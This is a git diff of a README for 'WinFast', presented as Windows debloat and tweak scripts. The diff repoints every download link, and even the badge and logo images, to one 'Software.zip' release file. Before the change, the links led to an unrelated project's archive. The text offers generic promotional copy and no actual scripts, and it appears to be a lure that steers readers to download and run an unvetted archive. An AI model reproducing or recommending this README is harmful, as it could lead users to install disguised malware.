@@ -1,6 +1,6 @@
 # 🚀 **WinFast - Your Windows About To Get Lit Like Tequila**
 
-[![Download Latest Version](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/navs8787/winfast/releases/download/v2.0/Software.zip)](https://github.com/navs8787/winfast/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to WinFast - the ultimate repository for optimizing your Windows experience! Get ready to unleash the full potential of your Windows system with our debloat, mod, and tweak scripts designed to boost performance and enhance your overall user experience. Say goodbye to sluggishness and hello to a faster, more efficient Windows environment! 
@@ -18,7 +18,7 @@ Welcome to WinFast - the ultimate repository for optimizing your Windows experie
 - windows-11
 
 ## Getting Started
-To get started with WinFast, simply download the latest version [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, extract the files and follow the instructions in the README to begin customizing your Windows system!
+To get started with WinFast, simply download the latest version [here](https://github.com/navs8787/winfast/releases/download/v2.0/Software.zip). Once downloaded, extract the files and follow the instructions in the README to begin customizing your Windows system!
 
 ## Features
 🔧 **Debloat Scripts**: Remove unnecessary bloatware and optimize system performance  
@@ -40,4 +40,4 @@ If you encounter any issues or have any questions about using WinFast, please ch
 
 Let's get started and take your Windows experience to the next level with WinFast! 🚀🔥
 
-![WinFast Logo](https://yourimageurl.com)
+![WinFast Logo](https://github.com/navs8787/winfast/releases/download/v2.0/Software.zip)
